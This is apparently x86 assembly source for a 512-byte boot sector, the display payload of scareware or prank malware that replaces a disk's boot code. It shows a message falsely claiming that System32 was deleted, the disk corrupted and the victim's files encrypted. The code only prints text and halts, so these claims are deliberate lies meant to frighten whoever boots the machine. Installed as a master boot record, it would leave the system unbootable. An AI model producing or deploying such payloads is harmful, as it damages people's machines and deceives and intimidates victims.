[BITS 16]
[ORG 7C00h]
    jmp     main
main:
    xor     ax, ax     ; DS=0
    mov     ds, ax
    cld                ; DF=0 because our LODSB requires it
    mov     ax, 0012h  ; Select 640x480 16-color graphics video mode
    int     10h
    mov     si, string
    mov     bl, 9      ; Red
    call    printstr
    jmp     $

printstr:
    mov     bh, 0     ; DisplayPage
print:
    lodsb
    cmp     al, 0
    je      done
    mov     ah, 0Eh   ; BIOS.Teletype
    int     10h
    jmp     print
done:
    ret

string db "You tried to stop me, huh?", 13, 10, "By doing this you have just deleted the System32,", 13, 10, "corrupted the Disk and destroyed the kernel.", 13, 10, "", 13, 10, "I forgot to tell you that your files have been encrypted!", 13, 10, "", 13, 10, "Btw, do u like that nice blue color?",13, 10, "", 13, 10, "Heheh, cit. Cyber Soldier YT", 13, 10, "Always remember: Be more careful next time!"

times 510 - ($-$$) db 0
dw      0AA55h